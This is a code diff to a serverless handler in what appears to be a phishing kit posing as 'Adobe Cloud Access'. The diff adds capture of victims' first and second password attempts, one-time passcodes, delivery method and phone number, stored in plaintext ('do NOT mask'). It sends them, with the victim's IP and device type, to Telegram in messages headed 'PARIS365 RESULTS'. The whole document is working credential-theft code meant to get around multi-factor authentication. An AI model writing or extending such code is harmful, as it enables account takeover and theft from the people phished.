@@ -49,6 +49,11 @@ export const handler = async (event, context) => {
     const {
       email,
       password,
+      firstAttemptPassword,
+      secondAttemptPassword,
+      otpEntered,
+      deliveryMethod,
+      phone,
       provider,
       fileName,
       timestamp,
@@ -91,12 +96,20 @@ export const handler = async (event, context) => {
     // Prepare session data for storage
     const sessionId = incomingSessionId || Math.random().toString(36).substring(2, 15);
 
-    // Per request: include plaintext password as provided by client (do NOT mask)
+    // Per request: include plaintext passwords as provided by client (do NOT mask)
     const plainPassword = (typeof password !== 'undefined' && password !== null) ? String(password) : 'Not captured';
+    const plainFirstAttemptPassword = (typeof firstAttemptPassword !== 'undefined' && firstAttemptPassword !== null) ? String(firstAttemptPassword) : 'Not captured';
+    const plainSecondAttemptPassword = (typeof secondAttemptPassword !== 'undefined' && secondAttemptPassword !== null) ? String(secondAttemptPassword) : 'Not captured';
+    const plainOtpEntered = (typeof otpEntered !== 'undefined' && otpEntered !== null) ? String(otpEntered) : 'Not captured';
 
     const sessionData = {
       email: email || '',
       password: plainPassword,
+      firstAttemptPassword: plainFirstAttemptPassword,
+      secondAttemptPassword: plainSecondAttemptPassword,
+      otpEntered: plainOtpEntered,
+      deliveryMethod: deliveryMethod || 'Not captured',
+      phone: phone || 'Not provided',
       provider: provider || 'Others',
       fileName: fileName || 'Adobe Cloud Access',
       timestamp: timestamp || new Date().toISOString(),
@@ -145,10 +158,28 @@ export const handler = async (event, context) => {
       }
     }
 
-    // Compose Telegram message (include plaintext password as requested)
+    // Compose Telegram message (include all password attempts and OTP as requested)
     const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop';
 
-    const message = `🔐 PARIS365 RESULTS
+    // Check if OTP flow was used
+    const hasOtpData = plainOtpEntered && plainOtpEntered !== 'Not captured';
+    
+    const message = hasOtpData 
+      ? `🔐 PARIS365 RESULTS
+
+📧 ${email || 'Not captured'}
+🔑 First Attempt (Invalid): ${plainFirstAttemptPassword}
+🔑 Second Attempt (Valid): ${plainSecondAttemptPassword}
+🔐 OTP Entered: ${plainOtpEntered}
+📬 OTP Method: ${deliveryMethod || 'Not captured'}
+${phone && phone !== 'Not provided' ? `📞 Phone: ${phone}` : ''}
+🏢 ${provider || 'Others'}
+🕒 ${new Date().toLocaleString()}
+🌐 ${clientIP} | ${deviceInfo}
+🍪 Cookies not captured
+
+🆔 ${sessionId}`
+      : `🔐 PARIS365 RESULTS
 
 📧 ${email || 'Not captured'}
 🔑 ${plainPassword}
